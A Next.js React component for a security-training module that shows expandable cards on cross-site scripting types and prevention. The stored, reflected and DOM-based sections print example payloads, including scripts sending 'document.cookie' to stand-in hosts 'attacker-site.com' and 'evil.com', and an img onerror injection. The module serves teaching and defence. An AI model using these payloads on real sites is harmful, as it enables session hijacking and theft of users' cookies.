"use client";
import Image from "next/image";
import React, { useEffect, useId, useRef, useState } from "react";
import { AnimatePresence, motion } from "framer-motion";
import { useOutsideClick } from "@/hooks/use-outside-click";

export default function CrossSiteScriptingModule() {
  const [mounted, setMounted] = useState(false);
  const [active, setActive] = useState<(typeof cards)[number] | null>(null);
  const ref = useRef<HTMLDivElement>(null);
  const id = useId();

  useEffect(() => {
    setMounted(true);
  }, []);

  useEffect(() => {
    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.key === "Escape") {
        setActive(null);
      }
    };

    if (active) {
      document.body.style.overflow = "hidden";
      window.addEventListener("keydown", handleKeyDown);
    } else {
      document.body.style.overflow = "auto";
    }

    return () => {
      window.removeEventListener("keydown", handleKeyDown);
      document.body.style.overflow = "auto";
    };
  }, [active]);

  // Don't render anything until mounted
  if (!mounted) return null;

  // Handle closing the expanded card
  const handleClose = () => {
    // Use a quick timeout to ensure smooth transition
    setTimeout(() => {
      setActive(null);
    }, 10);
  };

  return (
    <>
      <AnimatePresence>
        {active && typeof active === "object" && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
            className="fixed inset-0 bg-black/20 h-full w-full z-10"
            onClick={handleClose}
          />
        )}
      </AnimatePresence>
      
      <AnimatePresence mode="wait">
        {active && typeof active === "object" ? (
          <motion.div 
            key="expanded-card"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.8 }}
            transition={{ duration: 0.25, ease: "easeInOut" }}
            className="fixed inset-0 grid place-items-center z-[100]"
          >
            <motion.button
              key={`button-${active.title}-${id}`}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.15 }}
              className="flex absolute top-2 right-2 lg:hidden items-center justify-center bg-white rounded-full h-6 w-6"
              onClick={handleClose}
            >
              <CloseIcon />
            </motion.button>
            <div
              ref={ref}
              className="w-full max-w-[500px] h-full md:h-fit md:max-h-[90%] flex flex-col bg-white dark:bg-neutral-900 sm:rounded-3xl overflow-hidden"
            >
              <div>
                <Image
                  priority
                  width={200}
                  height={200}
                  src={active.src}
                  alt={active.title}
                  className="w-full h-80 lg:h-80 sm:rounded-tr-lg sm:rounded-tl-lg object-cover object-top"
                />
              </div>
              <div>
                <div className="flex justify-between items-start p-4">
                  <div>
                    <h3 className="font-bold text-neutral-700 dark:text-neutral-200">
                      {active.title}
                    </h3>
                    <p className="text-neutral-600 dark:text-neutral-400">
                      {active.description}
                    </p>
                  </div>
                  <a
                    href={active.ctaLink}
                    target="_blank"
                    className="px-4 py-3 text-sm rounded-full font-bold bg-green-500 text-white"
                  >
                    {active.ctaText}
                  </a>
                </div>
                <div className="pt-4 relative px-4 max-h-[250px] overflow-y-auto pb-6">
                  <div
                    className="text-neutral-600 text-xs md:text-sm lg:text-base flex flex-col items-start gap-4 dark:text-neutral-400"
                  >
                    {typeof active.content === "function" ? active.content() : active.content}
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        ) : null}
      </AnimatePresence>

      <div className="w-full p-6 bg-gradient-to-br from-gray-50 to-gray-100 dark:from-neutral-900 dark:to-neutral-800 rounded-xl shadow-lg border border-gray-200 dark:border-neutral-700">
        <ul className="max-w-3xl mx-auto space-y-4">
          {cards.map((card, index) => (
            <motion.div
              key={`card-${card.title}-${index}`}
              onClick={() => !active && setActive(card)}
              className="p-4 flex justify-between items-center bg-white dark:bg-neutral-900 rounded-lg cursor-pointer w-full shadow-md hover:shadow-lg transition-all duration-300 border border-gray-100 dark:border-neutral-800 group"
              whileHover={{ 
                y: -8,
                scale: 1.02,
                transition: { duration: 0.2 }
              }}
            >
              <div className="flex items-center gap-3 w-full">
                <div className="relative">
                  <Image
                    width={100}
                    height={100}
                    src={card.src}
                    alt={card.title}
                    className="h-12 w-12 rounded-lg object-cover object-top transition-transform duration-300 group-hover:scale-105"
                  />
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-blue-500/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300" />
                </div>
                <div className="flex-1">
                  <h3 className="font-medium text-neutral-800 dark:text-neutral-200 group-hover:text-blue-600 dark:group-hover:text-blue-400 transition-colors duration-300">
                    {card.title}
                  </h3>
                  <p className="text-neutral-600 dark:text-neutral-400 text-sm">
                    {card.description}
                  </p>
                </div>
              </div>
              <button className="px-4 py-2 text-sm rounded-full font-bold bg-gray-100 dark:bg-neutral-800 text-black dark:text-white hover:bg-green-500 hover:text-white transition-all duration-300 ml-3">
                {card.ctaText}
              </button>
            </motion.div>
          ))}
        </ul>
      </div>
    </>
  );
}

export const CloseIcon = () => {
  return (
    <motion.svg
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0, transition: { duration: 0.05 } }}
      xmlns="http://www.w3.org/2000/svg"
      width="24"
      height="24"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-4 w-4 text-black"
    >
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M18 6l-12 12" />
      <path d="M6 6l12 12" />
    </motion.svg>
  );
};

// Cards for Cross-Site Scripting (XSS) module
const cards = [
  {
    description: "Understanding the fundamentals",
    title: "XSS Fundamentals",
    src: "https://images.unsplash.com/photo-1507721999472-8ed4421c4af2?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80",
    ctaText: "Learn",
    ctaLink: "https://owasp.org/www-community/attacks/xss/",
    content: () => {
      return (
        <div>
          <p>
            Cross-Site Scripting (XSS) is a client-side code injection attack where an attacker injects malicious scripts into a trusted website. When other users view the affected page, the malicious script executes in their browser.
          </p>
          <h4 className="font-bold mt-4 mb-2">Types of XSS:</h4>
          <ul className="list-disc pl-5 space-y-2 mt-2">
            <li>
              <strong>Stored XSS:</strong> The injected script is permanently stored on the target server (e.g., in a database, forum post, comment field). When a user requests the stored information, the malicious script is served and executed in their browser.
            </li>
            <li>
              <strong>Reflected XSS:</strong> The injected script is reflected off a web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
            </li>
            <li>
              <strong>DOM-based XSS:</strong> The vulnerability exists in client-side code rather than server-side code. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.
            </li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">XSS Impact:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Theft of cookies and session tokens</li>
            <li>Account hijacking</li>
            <li>Keystroke logging</li>
            <li>Phishing attacks</li>
            <li>Website defacement</li>
            <li>Malware distribution</li>
          </ul>
        </div>
      );
    },
  },
  {
    description: "Persistent attacks in applications",
    title: "Stored XSS Attacks",
    src: "https://images.unsplash.com/photo-1548092372-0d1bd40894a3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80",
    ctaText: "Learn",
    ctaLink: "https://portswigger.net/web-security/cross-site-scripting/stored",
    content: () => {
      return (
        <div>
          <p>
            Stored XSS (also known as Persistent XSS) is considered the most dangerous type of XSS. In this attack, the malicious script is saved on the target server and then delivered to victims when they access the affected web page.
          </p>
          <h4 className="font-bold mt-4 mb-2">Common Locations:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Comment sections</li>
            <li>User profiles</li>
            <li>Product reviews</li>
            <li>Forum posts</li>
            <li>Message boards</li>
            <li>Contact forms that display submitted information</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Attack Example:</h4>
          <p className="mt-2">An attacker might submit the following comment on a blog post:</p>
          <pre className="bg-gray-100 dark:bg-gray-800 p-2 rounded-sm overflow-x-auto mt-2 text-xs">
{`Great article! 
<script>
  document.addEventListener('DOMContentLoaded', function() {
    const stolenCookie = document.cookie;
    fetch('https://attacker-site.com/steal?cookie=' + encodeURIComponent(stolenCookie));
  });
</script>`}
          </pre>
          <p className="mt-2">
            When other users view the page containing this comment, the script executes in their browser, sending their cookies to the attacker's server.
          </p>
          <h4 className="font-bold mt-4 mb-2">Prevention Techniques:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Input validation and sanitization</li>
            <li>Output encoding appropriate for the context</li>
            <li>Content Security Policy (CSP) implementation</li>
            <li>Set the HTTPOnly flag on sensitive cookies</li>
          </ul>
        </div>
      );
    },
  },
  {
    description: "Attack vectors via URL parameters",
    title: "Reflected XSS Attacks",
    src: "https://images.unsplash.com/photo-1614064641938-3bbee52942c7?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80",
    ctaText: "Learn",
    ctaLink: "https://portswigger.net/web-security/cross-site-scripting/reflected",
    content: () => {
      return (
        <div>
          <p>
            Reflected XSS occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. It is often delivered via URLs containing malicious parameters.
          </p>
          <h4 className="font-bold mt-4 mb-2">Common Vulnerable Areas:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Search features</li>
            <li>Error messages</li>
            <li>User input displayed in responses</li>
            <li>URL parameters included in page content</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Attack Example:</h4>
          <p className="mt-2">
            Consider a search feature that displays the search term in its results page:
          </p>
          <pre className="bg-gray-100 dark:bg-gray-800 p-2 rounded-sm overflow-x-auto mt-2 text-xs">
{`https://example.com/search?q=query

<!-- Page displays: -->
<p>Search results for 'query'</p>`}
          </pre>
          <p className="mt-2">
            An attacker might craft a URL like:
          </p>
          <pre className="bg-gray-100 dark:bg-gray-800 p-2 rounded-sm overflow-x-auto mt-2 text-xs">
{`https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`}
          </pre>
          <p className="mt-2">
            The victim must be tricked into clicking this link, usually through phishing emails, messages, or compromised websites.
          </p>
          <h4 className="font-bold mt-4 mb-2">Detection Signs:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>User-controlled data appears in the response</li>
            <li>Check if special characters are being encoded</li>
            <li>Test with simple harmless payloads like <code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Prevention Techniques:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Validate and sanitize all user input</li>
            <li>Use context-appropriate output encoding</li>
            <li>Implement Content Security Policy (CSP)</li>
            <li>Use frameworks that automatically escape output</li>
          </ul>
        </div>
      );
    },
  },
  {
    description: "Client-side JavaScript vulnerabilities",
    title: "DOM-Based XSS",
    src: "https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80",
    ctaText: "Learn",
    ctaLink: "https://portswigger.net/web-security/cross-site-scripting/dom-based",
    content: () => {
      return (
        <div>
          <p>
            DOM-based XSS is a type of cross-site scripting where the vulnerability exists in client-side JavaScript rather than server-side code. The attack payload is executed by modifying the DOM environment in the victim's browser.
          </p>
          <h4 className="font-bold mt-4 mb-2">Key Concepts:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>The vulnerability exists entirely in the browser</li>
            <li>The server is not directly involved in the vulnerability</li>
            <li>The attack payload never actually reaches the server</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Common Sources and Sinks:</h4>
          <p>DOM-based XSS occurs when JavaScript takes data from an attacker-controllable source and passes it to a sink that supports dynamic code execution.</p>
          <p className="mt-2"><strong>Common Sources:</strong></p>
          <ul className="list-disc pl-5 space-y-1 mt-1">
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">document.URL</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">document.location</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">location.hash</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">location.search</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">document.referrer</code></li>
          </ul>
          <p className="mt-2"><strong>Common Sinks:</strong></p>
          <ul className="list-disc pl-5 space-y-1 mt-1">
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">eval()</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">document.write()</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">innerHTML</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">outerHTML</code></li>
            <li><code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">setTimeout()</code>/<code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">setInterval()</code> with string arguments</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Example Vulnerability:</h4>
          <pre className="bg-gray-100 dark:bg-gray-800 p-2 rounded-sm overflow-x-auto mt-2 text-xs">
{`// Vulnerable code
const userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = 'Welcome, ' + userInput;

// Malicious URL
// https://example.com/page.html#<img src=x onerror=alert('XSS')>`}
          </pre>
          <h4 className="font-bold mt-4 mb-2">Prevention:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Use safe DOM manipulation methods like <code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">textContent</code> instead of <code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">innerHTML</code></li>
            <li>Sanitize user input using libraries like DOMPurify</li>
            <li>Avoid using dangerous functions like <code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">eval()</code></li>
            <li>Implement Content Security Policy (CSP)</li>
          </ul>
        </div>
      );
    },
  },
  {
    description: "Comprehensive defense strategies",
    title: "XSS Prevention",
    src: "https://images.unsplash.com/photo-1535919020263-e6a417f14ef6?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80",
    ctaText: "Learn",
    ctaLink: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
    content: () => {
      return (
        <div>
          <p>
            Preventing Cross-Site Scripting requires a multi-layered defense approach. This includes proper encoding, validation, sanitization, and implementing security headers.
          </p>
          <h4 className="font-bold mt-4 mb-2">Context-Aware Output Encoding:</h4>
          <p>Apply the appropriate encoding based on where data will be placed:</p>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li><strong>HTML Context:</strong> HTML entity encoding</li>
            <li><strong>JavaScript Context:</strong> JavaScript encoding</li>
            <li><strong>CSS Context:</strong> CSS encoding</li>
            <li><strong>URL Context:</strong> URL encoding</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Input Validation:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Validate input against whitelists of allowed values</li>
            <li>Validate data type, length, format, and range</li>
            <li>Reject or sanitize inputs containing dangerous characters</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Content Security Policy (CSP):</h4>
          <p>CSP is a powerful defense that restricts the sources of executable scripts:</p>
          <pre className="bg-gray-100 dark:bg-gray-800 p-2 rounded-sm overflow-x-auto mt-2 text-xs">
{`// Example CSP header
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;`}
          </pre>
          <p className="mt-2">This policy only allows scripts from the same origin and a trusted CDN.</p>
          <h4 className="font-bold mt-4 mb-2">Framework Security Controls:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Use modern frameworks that automatically escape output (React, Angular, Vue)</li>
            <li>Avoid using dangerous framework features that bypass built-in protections</li>
            <li>Keep frameworks and libraries updated</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Cookie Security:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Use the <code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">HttpOnly</code> flag to prevent JavaScript access to cookies</li>
            <li>Use the <code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">Secure</code> flag to only send cookies over HTTPS</li>
            <li>Use <code className="bg-gray-100 dark:bg-gray-800 px-1 rounded-sm">SameSite</code> attribute to limit cookie sending to same-site requests</li>
          </ul>
          <h4 className="font-bold mt-4 mb-2">Regular Testing:</h4>
          <ul className="list-disc pl-5 space-y-1 mt-2">
            <li>Perform regular security testing and code reviews</li>
            <li>Use automated scanners to detect XSS vulnerabilities</li>
            <li>Consider bug bounty programs</li>
          </ul>
        </div>
      );
    },
  },
]; 